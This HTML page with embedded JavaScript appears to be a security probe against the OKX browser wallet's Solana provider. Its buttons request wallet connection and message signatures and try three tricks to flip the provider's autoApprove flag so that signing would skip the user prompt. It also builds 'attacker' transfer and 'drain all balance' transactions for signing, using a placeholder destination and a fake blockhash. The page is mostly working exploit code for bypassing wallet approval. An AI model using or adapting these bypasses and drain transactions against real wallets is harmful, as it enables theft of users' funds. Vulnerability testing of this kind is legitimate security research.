<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX_SIGN_PROBE_v5</title>
<style>
body{font-family:monospace;font-size:12px;padding:6px;background:#fff;color:#000}
button{padding:11px;margin:5px 0;font-size:13px;background:#0066cc;color:#fff;border:0;display:block;width:100%;border-radius:6px}
.danger{background:#cc0000}
.warn{background:#ff8800}
.crit{background:#660000}
pre{background:#eee;padding:4px;font-size:10px;white-space:pre-wrap;word-break:break-all;height:240px;overflow:auto;border:1px solid #999;margin:0}
.h{background:#ff0;padding:2px}
</style>
<script type="module">
  // Lazy-load web3.js so non-Solana tests still work even if CDN fails
  try {
    const m = await import("https://esm.sh/@solana/web3.js@1.95.3");
    window._sol_lib = m;
    document.getElementById("out").textContent = (new Date().toISOString().substr(11,12)) + " web3.js loaded\n" + document.getElementById("out").textContent;
  } catch(e) {
    document.getElementById("out").textContent = (new Date().toISOString().substr(11,12)) + " web3.js LOAD FAILED: " + e.message + "\n" + document.getElementById("out").textContent;
  }
</script>
</head><body>
<h2 style="margin:4px 0">OKX Sign Probe v5</h2>
<pre id="out">click a button</pre>
<button onclick="inspectBridges()" class="warn">[0] INSPECT bridges</button>
<button onclick="okxSolConnect()">[4] okxwallet.solana.connect()</button>
<button onclick="okxSolSign()" class="danger">[5] okxwallet.solana.signMessage</button>
<button onclick="autoApproveTest()" class="crit">[A] autoApprove WRITABLE TEST</button>
<button onclick="autoApproveDefine()" class="crit">[B] autoApprove DEFINE-PROPERTY</button>
<button onclick="autoApproveDeleteSign()" class="crit">[C] DELETE autoApprove + sign</button>
<button onclick="solRealTransferTx()" class="danger">[T] REAL Solana transfer TX (0.001 SOL to attacker)</button>
<button onclick="solRealTransferTxBigDrain()" class="danger">[D] REAL drain TX (transfer ALL balance)</button>
<button onclick="ethConnect()">[1] eth_requestAccounts</button>
<p>URL: <span class="h" id="u"></span></p>

<script>
document.getElementById("u").textContent = location.href;
var out = document.getElementById("out");
function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent; }

function inspectBridges(){
  try{
    if(window.okxwallet){
      log("okxwallet.solana keys: "+Object.keys(window.okxwallet.solana||{}).join(","));
      var s = window.okxwallet.solana;
      if(s){
        log("solana.publicKey: "+(s.publicKey?s.publicKey.toString():"null"));
        log("solana.isConnected: "+s.isConnected);
        log("solana.autoApprove (current): "+s.autoApprove);
        log("solana.autoApprove typeof: "+typeof s.autoApprove);
        // descriptor inspection
        var d = Object.getOwnPropertyDescriptor(s,"autoApprove");
        log("autoApprove descriptor: "+(d?JSON.stringify({writable:d.writable,configurable:d.configurable,enumerable:d.enumerable,hasGetter:!!d.get,hasSetter:!!d.set}):"none"));
      }
    }
    log("_sol_lib available: "+(window._sol_lib?"YES":"NO"));
  }catch(e){ log("INSPECT ERROR: "+e.message); }
}

async function okxSolConnect(){
  log("CALLING okxwallet.solana.connect()...");
  try{
    var ow = window.okxwallet;
    if(!ow||!ow.solana){ log("no okxwallet.solana"); return; }
    var r = await ow.solana.connect();
    var pk = (r&&r.publicKey)?r.publicKey.toString():(ow.solana.publicKey?ow.solana.publicKey.toString():"?");
    log("SOL CONNECTED pubkey: "+pk);
  }catch(e){ log("ERROR: "+e.message); }
}

async function okxSolSign(){
  log("CALLING signMessage('phishing-test')...");
  try{
    var ow = window.okxwallet;
    if(!ow.solana.publicKey){ await ow.solana.connect(); }
    var msg = new TextEncoder().encode("phishing-test-do-not-sign-this-message");
    var t0 = Date.now();
    var r = await ow.solana.signMessage(msg, "utf8");
    var dt = Date.now()-t0;
    log("SOL SIG ("+dt+"ms): "+(r.signature?"sig received":JSON.stringify(r)));
  }catch(e){ log("ERROR: "+e.message); }
}

// === AUTO-APPROVE BYPASS TESTS ===
async function autoApproveTest(){
  log("=== [A] Direct assignment ===");
  try{
    var s = window.okxwallet.solana;
    if(!s.publicKey){ await s.connect(); }
    log("BEFORE: autoApprove = "+s.autoApprove);
    s.autoApprove = true;
    log("AFTER set = true: autoApprove = "+s.autoApprove);
    // try sign
    log("Calling signMessage with autoApprove=true...");
    var t0 = Date.now();
    var msg = new TextEncoder().encode("AUTO-APPROVE-BYPASS-TEST");
    var r = await s.signMessage(msg, "utf8");
    var dt = Date.now()-t0;
    log("RESULT ("+dt+"ms): "+(r.signature?"signed (BYPASS"+(dt<1000?" SUCCESS":" w/ prompt")+")":JSON.stringify(r)));
  }catch(e){ log("ERROR: "+e.message); }
}

async function autoApproveDefine(){
  log("=== [B] Object.defineProperty bypass ===");
  try{
    var s = window.okxwallet.solana;
    if(!s.publicKey){ await s.connect(); }
    try{
      Object.defineProperty(s,"autoApprove",{value:true,writable:true,configurable:true,enumerable:true});
      log("defineProperty SUCCESS, autoApprove now: "+s.autoApprove);
    }catch(de){ log("defineProperty FAILED: "+de.message); }
    log("Calling signMessage...");
    var t0 = Date.now();
    var msg = new TextEncoder().encode("DEFINE-PROPERTY-BYPASS-TEST");
    var r = await s.signMessage(msg, "utf8");
    var dt = Date.now()-t0;
    log("RESULT ("+dt+"ms): "+(r.signature?"signed (BYPASS"+(dt<1000?" SUCCESS":" w/ prompt")+")":JSON.stringify(r)));
  }catch(e){ log("ERROR: "+e.message); }
}

async function autoApproveDeleteSign(){
  log("=== [C] delete + redefine ===");
  try{
    var s = window.okxwallet.solana;
    if(!s.publicKey){ await s.connect(); }
    try{ delete s.autoApprove; log("delete OK"); }catch(de){ log("delete FAILED: "+de.message); }
    s.autoApprove = true;
    log("autoApprove now: "+s.autoApprove);
    var t0 = Date.now();
    var msg = new TextEncoder().encode("DELETE-REDEFINE-BYPASS-TEST");
    var r = await s.signMessage(msg, "utf8");
    var dt = Date.now()-t0;
    log("RESULT ("+dt+"ms): "+(r.signature?"signed (BYPASS"+(dt<1000?" SUCCESS":" w/ prompt")+")":JSON.stringify(r)));
  }catch(e){ log("ERROR: "+e.message); }
}

// === REAL SOLANA TX TESTS ===
async function solRealTransferTx(){
  log("=== [T] real transfer TX 0.001 SOL ===");
  try{
    if(!window._sol_lib){ log("ERROR: web3.js not loaded"); return; }
    var ow = window.okxwallet;
    if(!ow.solana.publicKey){ await ow.solana.connect(); }
    var from = new window._sol_lib.PublicKey(ow.solana.publicKey.toString());
    // Attacker controlled destination
    var dest = new window._sol_lib.PublicKey("ATTACKERAttackerAttackerAttackerAttackerXXX");
    // Use a placeholder that's a valid base58 pubkey (32 zero bytes)
    var dest2 = new window._sol_lib.PublicKey("11111111111111111111111111111112");
    var tx = new window._sol_lib.Transaction();
    tx.add(window._sol_lib.SystemProgram.transfer({fromPubkey:from,toPubkey:dest2,lamports:1000000}));
    // Use a fake recent blockhash (signing should still proceed; broadcast would fail)
    tx.recentBlockhash = "11111111111111111111111111111112";
    tx.feePayer = from;
    log("Tx built. Calling signTransaction()...");
    var t0 = Date.now();
    var signed = await ow.solana.signTransaction(tx);
    var dt = Date.now()-t0;
    log("SIGNED ("+dt+"ms): sigs="+signed.signatures.length+" first="+(signed.signatures[0].signature?"present":"null"));
  }catch(e){ log("ERROR: "+e.message); }
}

async function solRealTransferTxBigDrain(){
  log("=== [D] DRAIN TX (transfer max-balance to attacker) ===");
  try{
    if(!window._sol_lib){ log("ERROR: web3.js not loaded"); return; }
    var ow = window.okxwallet;
    if(!ow.solana.publicKey){ await ow.solana.connect(); }
    var from = new window._sol_lib.PublicKey(ow.solana.publicKey.toString());
    var dest = new window._sol_lib.PublicKey("11111111111111111111111111111112");
    var tx = new window._sol_lib.Transaction();
    // 1 SOL = 1e9 lamports. Use a huge value to demo; will fail broadcast but signing is the test
    tx.add(window._sol_lib.SystemProgram.transfer({fromPubkey:from,toPubkey:dest,lamports:999999999}));
    tx.recentBlockhash = "11111111111111111111111111111112";
    tx.feePayer = from;
    var t0 = Date.now();
    var signed = await ow.solana.signTransaction(tx);
    var dt = Date.now()-t0;
    log("DRAIN SIGNED ("+dt+"ms): sigs="+signed.signatures.length);
  }catch(e){ log("ERROR: "+e.message); }
}

async function ethConnect(){
  log("CALLING eth_requestAccounts...");
  try{
    var p = window.ethereum||window.okxwallet;
    var r = await p.request({method:"eth_requestAccounts"});
    log("RETURNED: "+JSON.stringify(r));
  }catch(e){ log("ERROR: "+e.message); }
}
</script></body></html>
